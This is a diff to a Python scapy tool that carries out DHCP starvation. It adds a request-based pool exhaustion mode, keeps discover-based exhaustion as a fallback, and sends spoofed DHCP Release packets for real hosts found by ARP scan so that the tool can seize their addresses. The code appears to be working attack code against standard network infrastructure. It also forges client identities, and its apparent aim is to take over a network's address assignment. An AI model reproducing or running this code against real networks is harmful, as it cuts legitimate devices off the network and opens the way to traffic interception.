@@ -22,7 +22,9 @@ import sys
 #### CONFIG #### -------------------------------------------------------------------
 iface = "eth0"  # Network interface to spoof
 delay_between_dhcp_discovers = 0.1  # seconds
+delay_between_dhcp_requests = 0.1  # seconds
 delay_between_arp_scans = 60  # seconds
+#exhaust_mode = 2 # 1: DHCP Discover, 2: DHCP Request
 
 #### GLOBAL VARIABLES #### ---------------------------------------------------------
 # Dict of all fake hosts k:MAC, v:fake_host
@@ -56,6 +58,7 @@ class fake_host:
         self.hostname = "elvispresley"
         self.lease_time = None  # IP Address Lease Time offered by DHCP Server
         self.acquisition_time = None  # Time when IP Address was obtained/renewed
+        self.ip_adquired = False  # Sets if this host has adquired successfully the IP Address
     #def __str__(self):
     #    return f"IP: {self.ip_address}, MAC: {self.mac_address}, hostname: {self.hostname}"
 '''
@@ -213,7 +216,8 @@ def send_request(host):
                               flags=0)
     dhcp_field = scapy.DHCP(options=[("message-type", "request"),
                                      ("client_id", b'\x01' + mac_address),
-                                     ("server_id", dhcp_server_ip),
+                                     #("server_id", dhcp_server_ip),
+                                     #("server_id", "10.0.0.250"),
                                      ('param_req_list', [53, 54, 51, 1, 6, 3, 50]),
                                      ("requested_addr", host.ip_address), 
                                      ("hostname", host.hostname),
@@ -298,6 +302,7 @@ def handle_dhcp_packet(packet):
     """
     #interface = packet.sniffed_on
     global fake_host_dict
+    global dhcp_server_ip, dhcp_server_mac
 
     # Option 2: DHCP Offer (response to Discover)
     if scapy.DHCP in packet and packet[scapy.DHCP].options[0][1] == 2:
@@ -310,7 +315,7 @@ def handle_dhcp_packet(packet):
         # Updating the fake host's IP address
         fake_host_dict[host_mac].ip_address = host_ip
         # Getting DHCP server info
-        global dhcp_server_ip, dhcp_server_mac
+        #global dhcp_server_ip, dhcp_server_mac
         dhcp_opts = get_dhcp_options(packet)
         dhcp_server_ip = dhcp_opts["server_id"] 
         dhcp_server_mac = packet[scapy.Ether].src
@@ -370,12 +375,17 @@ def handle_dhcp_packet(packet):
         if not is_this_mac_ours(host_mac) or host_mac == our_mac_address:
             write_to_log(f"Received unknown DHCP ACK: {host_ip} linked to {host_mac}")
             return None
-    
         # Updating the fake host's attributes with DHCP server's final decision
-        dhcp_opts_dict = get_dhcp_options(packet)
+        dhcp_opts = get_dhcp_options(packet)
         fake_host_dict[host_mac].ip_address = host_ip
-        fake_host_dict[host_mac].lease_time = dhcp_opts_dict['lease_time']
+        fake_host_dict[host_mac].lease_time = dhcp_opts['lease_time']
         fake_host_dict[host_mac].acquisition_time = datetime.now()
+        fake_host_dict[host_mac].ip_adquired = True
+        # Updating DHCP server's params
+        #global dhcp_server_ip
+        dhcp_server_ip = dhcp_opts["server_id"] 
+        #global dhcp_server_mac
+        dhcp_server_mac = packet[scapy.Ether].src
         write_to_log(f"ACK received: {host_ip} successfully linked to {host_mac}")
 
     # Option 6: DHCP NAK, unable to obtain a dynamic IP address
@@ -383,12 +393,14 @@ def handle_dhcp_packet(packet):
         host_mac = mac_to_str(packet[scapy.BOOTP].chaddr)
         write_to_log(f"NAK received!: {host_mac} IP address' adquisition rejected")
         # Check if NAK is for us
+        '''
         if is_this_mac_ours(host_mac):
             # Starting again DHCP handshake. Sending new DHCP Discover
             send_discover(fake_host_dict[host_mac])
 
     else:
         None
+        '''
     
 
 def is_this_mac_ours(mac_address):
@@ -477,7 +489,7 @@ def renew_hosts_ip_leases():
     For every fake host, decides if a new DHCP Request is needed to keep IP address linked to host
     """
     for host in fake_host_dict.values():
-        if is_ip_renew_needed(host.lease_time, host.acquisition_time):
+        if is_ip_renew_needed(host.lease_time, host.acquisition_time) and host.ip_adquired == True:
             # Resetting Transaction ID
             host.transaction_id = get_transaction_id()
             # Unicast DHCP Request to renew IP address lease
@@ -486,8 +498,8 @@ def renew_hosts_ip_leases():
             #global fake_host_dict
             #fake_host_dict[host.mac_address].acquisition_time = datetime.now()
 
-
-def starve_dhcp_server(number, delay):
+def pool_exhaustion_with_discover(number, delay):
+#def starve_dhcp_server(number, delay):
     """
     Sends a defined amount of DHCP Discover packets
     """
@@ -499,6 +511,23 @@ def starve_dhcp_server(number, delay):
         # Sending discover
         send_discover(fake_host)
     write_to_log(f"{number} DHCP Discover(s) have been sent")
+
+
+def pool_exhaustion_with_request(ip_list, delay):
+    """
+    Sends an DHCP Request for every IP address on 
+    """
+    for ip in ip_list:
+        time.sleep(delay)
+        # Create a new ficticious host and adds it to the dictionary
+        fake_host = create_fake_host()
+        fake_host.ip_address = ip
+        fake_host_dict[fake_host.mac_address] = fake_host
+        # Sending request
+        send_request(fake_host)
+        #send_request
+    #write_to_log(f"{number} DHCP Discover(s) have been sent")
+
 
 
 def ip_lease_renewal(renewal_time):
@@ -518,10 +547,11 @@ def ip_lease_renewal(renewal_time):
             
 def release_all_ips():
     """
-    Sends a DHCP Release for every fake host
+    Sends a DHCP Release for every fake host with an IP address linked
     """
     for host in fake_host_dict.values():
-        send_release(host.mac_address, host.ip_address)
+        if host.ip_address != None:
+            send_release(host.mac_address, host.ip_address)
     write_to_log(f"All IP addresses have been released!")
     
 
@@ -534,9 +564,9 @@ def perform_arp_scan(network):
     # Getting Pi-hole DHCP Server's IP lease list
     spoofed_hosts = get_dhcp_leases()
     # Updating json file
-    global found_devices
-    found_devices = update_device_info(ip_mac_data, found_devices, spoofed_hosts)
-    save_results_to_json(found_devices, json_file)
+    #global found_devices
+    #found_devices = update_device_info(ip_mac_data, found_devices, spoofed_hosts)
+    #save_results_to_json(found_devices, json_file)
     
     for ip, mac in ip_mac_data:
         # Checking if discovered host is not DHCP server or not already spoofed
@@ -545,7 +575,12 @@ def perform_arp_scan(network):
             # Send DHCP Release to force a new IP address adquisition by the host
             send_release(mac, ip)
             # Wait for t seconds and try to catch that released IP address
-            starve_dhcp_server(1, 1)
+            pool_exhaustion_with_discover(1, 1)
+    # Wait and update json with new spoofed devices
+    time.sleep(10)
+    global found_devices
+    found_devices = update_device_info(ip_mac_data, found_devices, spoofed_hosts)
+    save_results_to_json(found_devices, json_file)
 
 
 def arp_scan(network):
@@ -657,15 +692,19 @@ def main():
     dhcp_sniffer.start()
 
     # Pool exhaustion: getting all avalaible IP from DHCP server's pool
-    #delay_between_dhcp_discovers = 0.1 # seconds
-    starve_dhcp_server(max_hosts, delay_between_dhcp_discovers)
-
-    time_to_wait_to_receive_all_ack = 10  # seconds
-
+    pool_exhaustion_with_request(avalaible_hosts, delay_between_dhcp_requests)
+    time_to_wait_to_receive_all_ack = 30  # seconds
     write_to_log(f"Waiting {time_to_wait_to_receive_all_ack} second(s) for the rest of DHCP ACK to be received")
     time.sleep(time_to_wait_to_receive_all_ack)
+    # If no ACK is received, DHCP server's IP address can't be catched. Trying more reliable exhaustion with Discover
+    if dhcp_server_ip == "":
+        write_to_log(f"Pool exhaustion with DHCP Request failed. Trying exhaustion with DHCP Discover")
+        pool_exhaustion_with_discover(max_hosts, delay_between_dhcp_requests)
+        write_to_log(f"Waiting {time_to_wait_to_receive_all_ack} second(s) for the rest of DHCP ACK to be received")
+        time.sleep(time_to_wait_to_receive_all_ack)
+
     # Removing all fake hosts with no IP address linked due to pool exhaustion
-    remove_unused_fake_hosts()
+    #remove_unused_fake_hosts()
   
     # Setting ARP scan thread/scheduler
     #delay_between_arp_scans = 600 # seconds
